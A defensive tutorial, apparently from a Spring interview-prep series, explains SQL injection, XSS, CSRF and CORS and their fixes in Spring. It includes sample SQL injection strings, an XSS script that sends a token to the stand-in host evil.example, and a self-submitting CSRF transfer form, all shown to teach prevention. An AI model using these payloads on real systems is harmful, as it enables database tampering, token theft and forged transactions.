# Spring Part 15: Web Attacks: SQL Injection, XSS, CSRF and CORS

Every JWT or Spring Security answer draws these follow-ups: why is a token in localStorage risky, why can a stateless API turn CSRF off, and who actually enforces CORS. Four attacks, one idea each.

## 1. SQL injection [P0]

A search endpoint builds SQL from the user's input:

```java
// Broken
String sql = "SELECT * FROM users WHERE email = '" + email + "'";
ResultSet rs = stmt.executeQuery(sql);
```

The attacker sends `email = ' OR '1'='1`. The query becomes:

```sql
SELECT * FROM users WHERE email = '' OR '1'='1'
```

`'1'='1'` is always true, so every user comes back. With `'; DROP TABLE users; --` it can be worse.

**SQL injection** happens when user input is pasted into the text of a query, so the database reads data as code.

The fix is a **prepared statement**: the query text is fixed and sent first; values are sent separately as parameters, so they are never parsed as SQL.

```java
// Fixed
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE email = ?");
ps.setString(1, email);
```

The input `' OR '1'='1` is now just an odd email address that matches nobody.

Where ORMs are safe and where they are not:
- Safe: Spring Data derived methods (`findByEmail(email)`), JPQL with parameters (`where u.email = :email`), the Criteria API.
- Not safe: concatenating input into `@Query`, `createQuery(...)` or `createNativeQuery(...)` strings. An ORM does not protect a string you built yourself.
- `ORDER BY` columns and table names cannot be parameters. Map the input to an allowlist: `Set.of("name", "createdAt")`.

Defence in depth: give the app's database user only the rights it needs, so even an injected `DROP TABLE` fails.

Say it like this: "SQL injection is user input becoming part of the query text; prepared statements send values separately so they can never be parsed as SQL, and ORMs are only safe when you use their parameters instead of building strings."

## 2. XSS (cross-site scripting) [P0]

A product review page shows comments as raw HTML. An attacker posts this comment:

```html
<script>fetch('https://evil.example/steal?t=' + localStorage.getItem('token'))</script>
```

Every user who opens the page runs the script, in the site's own origin, and sends their token to the attacker.

**XSS** is getting the attacker's script to run inside your site's pages. Three kinds:
- **Stored**: the script is saved (a comment, a profile name) and served to every viewer. The example above.
- **Reflected**: the script is in a link's query string, and the server echoes it into the page.
- **DOM-based**: the page's own JavaScript writes untrusted input into the page, for example with `innerHTML`.

Fixes, in order of importance:
- **Escape output** for where it lands: `<` becomes `&lt;`, so the text shows instead of running. Thymeleaf `th:text` and React `{value}` escape by default. `th:utext`, `dangerouslySetInnerHTML` and `innerHTML` do not.
- **Content-Security-Policy** header, for example `script-src 'self'`: the browser refuses inline scripts and scripts from other domains. A second line of defence.
- **HttpOnly cookies** for session and refresh tokens: JavaScript cannot read them, so an injected script cannot steal them.
- Validate input as well, but never rely on input filtering alone.

Why a JWT in `localStorage` is risky: any script running on the page can read `localStorage`. One XSS hole and every logged-in user's token is stolen, and a JWT stays valid until it expires. An HttpOnly cookie cannot be read by script.

Correction: an HttpOnly cookie does not stop XSS. The injected script can still send requests from the victim's browser, and the cookie goes along. It only stops the token being stolen and used elsewhere.

Say it like this: "XSS is the attacker's script running in my origin; I escape output by context and add a Content-Security-Policy, and I keep tokens in HttpOnly cookies because localStorage is readable by any injected script."

## 3. CSRF (cross-site request forgery) [P0]

A user is logged in to `bank.example`; their browser holds the session cookie. They visit `evil.example`, which contains:

```html
<form action="https://bank.example/transfer" method="POST">
  <input type="hidden" name="to" value="attacker"><input type="hidden" name="amount" value="50000">
</form>
<script>document.forms[0].submit()</script>
```

![A CSRF attack and the token that stops it](/docs-img/spring-15/csrf.svg)

1. The evil page submits the form to the bank.
2. The browser automatically attaches the bank's cookie, because the request goes to the bank.
3. The bank sees a valid session and moves the money. The attacker never saw the cookie; they only made the browser use it.

**CSRF** tricks a logged-in browser into sending a state-changing request the user never meant to send. It works only because the browser attaches credentials automatically, which is what cookies do.

Defences:
- **CSRF token** (synchronizer token): the server puts a random token in its own pages and requires it on every state-changing request. The evil site cannot read the bank's pages, so it cannot know the token.
- **SameSite cookies**: `SameSite=Lax` (the browser default in Chrome) stops the cookie being sent on cross-site POSTs; `Strict` stops it on all cross-site requests.
- Check the `Origin` header on state-changing requests.

In Spring Security, CSRF protection is **on by default**. The `CsrfFilter` requires a token on POST, PUT, PATCH and DELETE; GET, HEAD, OPTIONS and TRACE must not change state.

Why a stateless JWT API can disable it: if the token travels in the `Authorization: Bearer ...` header, the browser never adds it automatically. The evil site's form cannot set that header, so the forged request arrives with no credentials.

```java
http.csrf(csrf -> csrf.disable())     // only for APIs authenticated by a header, never by cookies
    .sessionManagement(s -> s.sessionCreationPolicy(SessionCreationPolicy.STATELESS));
```

Correction: "we use JWT, so CSRF is impossible." If the JWT is stored in a cookie, the browser sends it automatically and CSRF is back. Keep CSRF protection, or SameSite cookies, whenever auth rides on cookies.

Say it like this: "CSRF abuses the browser attaching cookies automatically; I stop it with a CSRF token and SameSite cookies, and an API that only reads a Bearer header can disable it, because no browser attaches that header on its own."

## 4. CORS (cross-origin resource sharing) [P0]

A React app on `https://app.example` calls an API on `https://api.example`. The call fails in the browser with "has been blocked by CORS policy", yet the same call works in Postman.

First, two terms:
- An **origin** is scheme + host + port. `https://app.example` and `https://api.example` are different origins; so are `http://localhost:3000` and `http://localhost:8080`.
- The **same-origin policy** is the browser rule that a page's JavaScript may send a request to another origin but may not read the response, unless that origin allows it.

**CORS** is how the server says which other origins may read its responses, using response headers. The **browser** enforces it; Postman and curl ignore it.

![A CORS preflight](/docs-img/spring-15/cors.svg)

For a request that is not "simple" (methods other than GET, HEAD or POST, a JSON body, or an `Authorization` header), the browser first sends a **preflight**:
1. The browser sends `OPTIONS /orders` with `Origin: https://app.example`, `Access-Control-Request-Method: PUT` and `Access-Control-Request-Headers: authorization`.
2. The server replies with `Access-Control-Allow-Origin: https://app.example`, the allowed methods and headers, and optionally `Access-Control-Max-Age` so the browser caches the answer.
3. Only if the answer allows it does the browser send the real `PUT`.

Spring setup that works:
```java
http.cors(Customizer.withDefaults());       // uses the CorsConfigurationSource bean

@Bean CorsConfigurationSource cors() {
    var c = new CorsConfiguration();
    c.setAllowedOrigins(List.of("https://app.example"));
    c.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE"));
    c.setAllowedHeaders(List.of("Authorization", "Content-Type"));
    c.setAllowCredentials(true);
    var src = new UrlBasedCorsConfigurationSource();
    src.registerCorsConfiguration("/**", c);
    return src;
}
```

Traps:
- Configure CORS in Spring Security, not only with `@CrossOrigin`. The preflight carries no credentials, so without `http.cors(...)` the security chain rejects it with 401 before Spring MVC's CORS handling runs. `http.cors` puts `CorsFilter` in front of authentication.
- `Access-Control-Allow-Origin: *` cannot be combined with `Allow-Credentials: true`. List the real origins.

Correction: "CORS protects my API." It does not. It relaxes the browser's same-origin policy for chosen origins. Any server, script or curl call can still hit the API. Authentication and authorization protect it.

Also asked: how CORS relates to CSRF. A forged form POST is a "simple" request, so it is sent without a preflight; CORS only stops the evil page from reading the response. CORS is not a CSRF defence.

Say it like this: "CORS is the server telling the browser which other origins may read its responses; the browser enforces it with a preflight for non-simple requests, so in Spring I configure it in the security chain so preflights are not rejected before CORS runs."

**Before the next part:** from memory, draw the CSRF attack (user, evil site, bank, cookie) and the CORS preflight, then say in one line each why a Bearer-header API is safe from CSRF and why CORS does not protect an API.
